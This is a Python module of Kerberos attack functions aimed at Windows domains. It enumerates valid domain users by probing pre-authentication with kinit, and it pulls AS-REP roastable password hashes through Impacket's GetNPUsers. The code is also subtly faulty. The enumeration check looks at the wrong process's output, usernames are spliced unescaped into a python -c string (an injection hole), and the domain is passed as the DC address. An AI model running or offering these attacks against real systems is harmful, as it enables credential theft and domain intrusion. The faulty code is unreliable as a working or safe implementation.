"""Kerberos attacks — AS-REP roasting, Kerberoasting, user enumeration."""
import subprocess, os, re

def kerberos_user_enum(domain, userlist_path):
    """Enumerate valid domain users via Kerberos pre-auth."""
    if not os.path.exists(userlist_path): return f"Userlist not found: {userlist_path}"
    valid = []
    with open(userlist_path) as f:
        for line in f:
            user = line.strip()
            if not user: continue
            try:
                r = subprocess.run(["python3","-c",f"import subprocess; subprocess.run(['kinit','{user}@{domain}'],input=b'wrong',capture_output=True)"],
                                   capture_output=True, text=True, timeout=5)
                if "Preauthentication failed" in (r.stderr or ""):
                    valid.append(user)
            except: pass
    return f"Valid users ({len(valid)}): {', '.join(valid[:20])}" if valid else "No valid users found or krb5 not configured"

def kerberos_asrep_roast(domain, user):
    """Attempt AS-REP roasting (users without pre-auth). Requires Impacket."""
    try:
        r = subprocess.run(["python3","-m","impacket.examples.GetNPUsers",f"{domain}/{user}","-no-pass","-dc-ip",domain],
                          capture_output=True, text=True, timeout=30)
        if "$krb5asrep" in r.stdout:
            return f"AS-REP roastable! Hash:\n{r.stdout[:2000]}"
        return f"User has pre-auth enabled or error: {r.stderr[:300]}"
    except FileNotFoundError: return "Impacket not installed. Run: pip install impacket"
    except Exception as e: return f"Error: {e}"
